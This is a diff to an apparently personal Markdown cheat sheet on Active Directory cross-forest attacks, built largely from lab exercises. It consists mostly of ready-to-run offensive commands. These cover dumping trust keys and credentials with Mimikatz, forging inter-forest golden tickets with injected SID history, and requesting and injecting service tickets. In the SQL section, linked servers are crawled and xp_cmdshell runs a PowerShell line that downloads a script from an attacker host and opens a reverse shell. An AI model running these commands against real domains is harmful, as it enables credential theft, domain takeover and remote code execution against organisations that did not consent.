@@ -12,6 +12,7 @@
 * [Cross Domain attacks](#Cross-Domain-attacks)
   * [MS Exchange](#MS-Exchange2)
   * [Azure AD](#Azure-AD)
+  * [Trust abuse SQL](#Trust-abuse-SQL)
   * [Child to Forest Root](#Child-to-Forest-Root)
     * [Trust key](#Trust-key)
     * [Krbtgt hash](#Krbtgt-hash)
@@ -19,7 +20,11 @@
   * [Kerberoast](#Kerberoast2)
   * [Printer Bug](#Printer-bug2) 
   * [Trust flow](#Trust-flow) 
-* [Trust abuse SQL](#Trust-abuse-SQL) 
+  * [Trust abuse SQL](#Trust-abuse-SQL)
+  * [Foreign Security Principals](#Foreign-Security-Principals)
+  * [ACLs](#ACLs)
+  * [Pam Trust](#Pam-Trust)
+ 
 
 ## Kerberoast
 - https://github.com/GhostPack/Rubeus
@@ -463,45 +468,95 @@ netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
 See [Printer Bug](#Printer-bug) for exploitation
 
 ### Trust flow
+-  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
+-  There is no way to enumerate which resources are shared.
+
 #### Dump trust keys
-Look for in trust key from child to parent (first command)
-Look for NTLM hash (second command)
+- Look for in trust key from child to parent (first command)
 ```
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
 
 #### Create a intern-forest TGT
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /ticket:<KIRBI FILE>"'
+```
+
+#### Create and inject TGS
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+```
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /pt
 ```
 
 #### Create a TGS for a service (kekeo_old)
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
 ```
-./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
+./asktgs.exe <KIRBI FILE> CIFS/<TARGET SERVER>
 ```
 
-#### Use the TGT
+#### Inject the TGS
 ```
-./kirbikator.exe lsa <kirbi file>
+./kirbikator.exe lsa <KIRBI FILE>
 ```
 
 #### Check access to server
 ```
-ls \\<servername>\<share>\
+dir \\<SERVER NAME>\<SHARE>\
 ```
 
+### SID history enabled
+- If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!
+- If false its always possible even with other SIDS?
+
+#### Enumerate if SIDFilteringForestAware is enabled
+- Run on the DC.
+```
+Get-ADTrust -Filter *
+```
+
+#### Enumerate groups of the target forest with SID higher then 1000
+```
+Get-ADGroup -Filter 'SID -ge "S-1-5-21-<DOMAIN SID PART>-1000"' -Server <TARGET FOREST>
+```
+
+#### Create a intern-forest TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
+```
+
+#### Create and inject TGS
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+```
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /pt
+```
+
+#### Create a TGS for a service (kekeo_old)
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+```
+./asktgs.exe <KIRBI FILE> <SERVICE>/<TARGET SERVER>
+```
+
+#### Inject the TGS
+```
+./kirbikator.exe lsa <KIRBI FILE>
+```
+
+#### Use the TGS and execute DCsync or psremoting etc!
+
 ## Trust abuse SQL
+- Could be possible cross domain or cross forest!
 ```
 . .\PowerUpSQL.ps1
 ```
 
-#### Discovery SPN scanning
+#### Discovery of SQL instances (SPN scanning)
 ```
 Get-SQLInstanceDomain
 ```
 
-#### Check accessibility
+#### Check accessibility to SQL servers
 ```
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
@@ -514,12 +569,17 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
 #### Search for links to remote servers
 ```
-Get-SQLServerLink -Instance <sql instance> -Verbose
+Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
 ```
 
-#### Enumerate database links
+#### Crawl links to remote servers
 ```
-Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
+```
+
+#### Crawl and try to use xp_cmdshell on every linke
+```
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
 ```
 
 #### Enable xp_cmdshell
@@ -530,9 +590,53 @@ Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance
 #### Execute commands
 ```
 Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
+Invoke-SQLOSCmd (find out syntax)
+```
+
+#### Execute command through links
+```
+select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
 ```
 
 #### Execute reverse shell example
 ```
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
+```
+
+### Foreign Security Principals
+- A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).
+
+#### Enumerate FSP's
+```
+Find-ForeignGroup -Verbose
+Find-ForeignUser -Verbose
+```
+
+### ACLS
+- Access to resources in a forest trust can also be provided without using FSPs using ACLs.
+```
+Find-InterestingDomainAcl -Domain <TRUST FOREST>
+```
+- Abuse ACL to other forest.
+
+### Pam Trust
+- PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages. 
+- PAM trust provides the ability to access a forest with high privileges without using credentials of the current forest. Thus, better security for the bastion forest which is much desired.
+-  To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.
+
+#### Enumerate if there is a PAM trust
+- Run on the DC
+```
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
+```
+
+#### Check which users are members of the shadow principalks
+- Run on the DC
+```
+{Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+```
+
+#### Pssession to the other forest machine
+```
+Enter-PSSession <IP> -Authentication NegotiateWithImplicitCredential
 ```
